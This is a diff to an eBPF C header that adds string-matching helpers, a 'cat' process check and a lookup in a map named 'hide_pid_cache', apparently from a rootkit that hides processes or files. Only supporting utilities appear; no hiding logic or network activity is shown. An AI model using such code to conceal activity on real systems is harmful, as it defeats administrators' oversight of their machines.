@@ -9,12 +9,26 @@
 
 #include "bpf_config.h"
 #include "bpf_debug.h"
+#include "../lib/ftlib.h"
 
 /**
  * Nigthmares from Windows...
  */
-static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){
+static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size)
+{ 
     __builtin_memset(dst, 0, size);
+}
+
+/**
+ * Simple helper function to identify if current COMM is the "cat" binary
+ */
+static __always_inline int __is_binary_cat(void) 
+{
+    char comm[TASK_COMM_LEN] = {0};
+    bpf_get_current_comm(comm, sizeof(comm));
+    
+    //32 overkill but ok.
+    return ft_strcmp(comm, CAT_BIN, 32) == 0;
 }
 
 /**
@@ -25,7 +39,8 @@ static __always_inline void __rtl_secure_zero_memory(void *dst, __u32 size){
  * 
  * @return 0 if success, < 0 if error.
  */
-static __always_inline int __resolve_exe_basename(char *dst, size_t sdst){
+static __always_inline int __resolve_exe_basename(char *dst, size_t sdst) 
+{
     struct task_struct *tsk = (void*)bpf_get_current_task();
     if(!tsk)
         return -1;
@@ -48,7 +63,8 @@ static __always_inline int __resolve_exe_basename(char *dst, size_t sdst){
 /**
  * Utility function to check in hide_from_cache has bin target.
  */
-static __always_inline int __is_target_bin(void){
+static __always_inline int __is_target_bin(void) 
+{
     char bin[DNAME_MAX] = {0};
     if(__resolve_exe_basename(bin, sizeof(bin)) < 0)
         return 0;
@@ -58,6 +74,100 @@ static __always_inline int __is_target_bin(void){
         return 0;
 
     return *bin_cache_flag == 1;
+}
+
+static __always_inline int __is_target_process(__u32 pid)
+{
+	return bpf_map_lookup_elem(&hide_pid_cache, &pid) != NULL;
+}
+
+//----------------------------------------------------
+// ┌────────────────────────────────────┐
+//  STR MATCHING
+// └────────────────────────────────────┘
+//----------------------------------------------------
+
+struct strstr_ctx {
+	const char *s1;
+	char  s2[MAX_STR_LEN]; 
+	__u32 l1;
+	__u32 l2;
+	__s64 found_at;
+};
+
+static long __strstr_step(__u32 i, void *data)
+{
+	struct strstr_ctx *ctx = (struct strstr_ctx *)data;
+
+	if (i + ctx->l2 > ctx->l1)
+		return 1;
+
+	__u32 j;
+	bool match = true;
+
+	for (j = 0; j < ctx->l2 && j < MAX_STR_LEN; j++) {
+		__u32 idx = (i + j) & (MAX_STR_LEN - 1);
+		if (ctx->s1[idx] != ctx->s2[j]) { 
+			match = false;
+			break;
+		}
+	}
+
+	if (match) {
+		ctx->found_at = i;
+		return 1;
+	}
+
+	return 0;
+}
+
+/**
+ * Custom eBPF like strstr function.
+ */
+static __always_inline char *__bpf_strstr(const char *s1, const char *s2)
+{
+	struct strstr_ctx ctx = { .s1 = s1, .found_at = -1 };
+
+	/* 
+    * Safe copy: bpf_probe_read_kernel_str stops at \0 or
+    * MAX_STR_LEN, and does not require static proof of the actual
+    * extent of s2 (that's precisely what it is designed for).
+    */
+	long ret = bpf_probe_read_kernel_str(ctx.s2, sizeof(ctx.s2), s2);
+	if (ret < 0)
+		return NULL;
+
+	ctx.l2 = (__u32)ret - 1; /* ret inclut le \0 */
+	if (!ctx.l2)
+		return (char *)s1;
+
+	ctx.l1 = ft_strlen(s1, MAX_STR_LEN);
+
+	bpf_loop(MAX_STR_LEN, __strstr_step, &ctx, 0);
+
+	if (ctx.found_at >= 0)
+		return (char *)s1 + ctx.found_at;
+
+	return NULL;
+}
+
+/**
+ * Extract the first path component (text before the first '/') into `out`.
+ */
+static __always_inline char *__extract_dname_from_path(char *buf, __u32 buf_sz)
+{
+    if (!buf)
+        return NULL;
+
+    for (__u32 i = 0; i < buf_sz; i++) {
+        if (buf[i] == '/') {
+            buf[i] = '\0';
+            return buf;
+        }
+        if (buf[i] == '\0')
+            break;
+    }
+    return buf;
 }
 
 #endif
